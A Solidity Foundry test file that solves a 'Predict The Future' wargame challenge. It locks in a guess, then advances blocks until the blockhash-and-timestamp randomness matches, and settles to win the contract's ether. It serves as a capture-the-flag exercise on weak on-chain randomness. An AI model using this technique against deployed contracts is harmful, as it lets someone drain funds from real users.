// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { PredictTheFutureChallengeFactory } from "../src/challenges/08_PredictTheFuture/PredictTheFutureChallengeFactory.sol";

interface IPredictTheFutureChallenge {
    function isComplete() external returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureTest is Test {
    IPredictTheFutureChallenge public challenge;

    function setUp() public {
        PredictTheFutureChallengeFactory factory = new PredictTheFutureChallengeFactory();
        address challengeAddress = factory.createChallenge{ value: 1 ether }();
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }

    function test() public {
        challenge.lockInGuess{ value: 1 ether }(1);
        vm.roll(block.number + 1);

        uint8 answer;
        while (answer != 1) {
            vm.roll(block.number + 1);
            answer =
                uint8(
                    uint256(
                        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
                    )
                ) %
                10;
        }
        challenge.settle();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
